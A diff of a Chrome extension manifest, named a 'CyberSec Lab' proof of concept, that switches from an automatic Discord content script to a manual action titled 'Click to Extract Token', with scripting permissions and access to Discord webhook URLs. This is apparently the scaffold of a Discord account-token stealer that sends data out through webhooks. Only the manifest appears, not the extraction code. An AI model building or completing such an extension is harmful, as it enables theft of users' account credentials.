@@ -1,15 +1,13 @@
 {
   "manifest_version": 3,
-  "name": "Ultimate Security Lab POC",
-  "version": "4.0",
-  "permissions": ["storage", "webNavigation"],
-  "host_permissions": ["*://*.discord.com/*", "https://*.discordapp.com/*"],
-  "content_scripts": [
-    {
-      "matches": ["*://*.discord.com/*"],
-      "js": ["content.js"],
-      "run_at": "document_start",
-      "all_frames": true
-    }
-  ]
+  "name": "CyberSec Lab - Manual Trigger",
+  "version": "6.0",
+  "permissions": ["storage", "activeTab", "scripting"],
+  "host_permissions": ["*://*.discord.com/*", "https://discord.com/api/webhooks/*"],
+  "action": {
+    "default_title": "Click to Extract Token"
+  },
+  "background": {
+    "service_worker": "background.js"
+  }
 }
